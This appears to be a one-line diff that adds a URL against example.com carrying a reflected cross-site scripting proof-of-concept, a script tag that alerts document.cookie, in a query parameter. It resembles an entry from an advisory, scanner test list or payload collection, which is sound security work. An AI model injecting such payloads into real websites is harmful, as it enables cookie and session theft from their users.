@@ -1,0 +1,1 @@
+http://www.example.com/path/?op=mi&id=2&pl="><script>alert(document.cookie)</script>
